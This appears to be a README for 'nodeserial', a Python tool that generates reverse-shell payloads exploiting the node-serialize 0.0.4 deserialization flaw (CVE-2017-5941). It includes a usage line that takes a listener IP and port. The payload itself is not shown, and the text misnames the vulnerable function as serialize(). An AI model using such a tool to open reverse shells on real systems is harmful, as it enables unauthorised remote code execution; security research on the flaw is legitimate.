# nodeserial 
## Explore Insecure Deserialization in nodejs

Per CVE-2017-5941, the vulnerability occurs when untrusted data is passed to a serialize() function, resulting in remote code execution passing a JavaScript Object with an Immediately Invoked Function Expression (IIFE).
Note that this affects the node-serialize 0.0.4 package for Node.js.
This tool was made to automate this process, generating a payload for reverse shell, have fun exploring nodejs deserialization in vulnerable applications.

ode-serialize package 0.0.4
![image](https://user-images.githubusercontent.com/54555784/229000366-0c318500-bd10-47c1-ab07-d72f8aadd9e9.png)

```
Usage: python3 nodeserial.py -l 10.9.8.16 -p 443 --params username -e b64
```

---
<p align="center">
  <img height=200 src="https://user-images.githubusercontent.com/54555784/229000743-76c01e01-0ce6-41e0-90db-0bb1041bb6d4.gif">
</p>
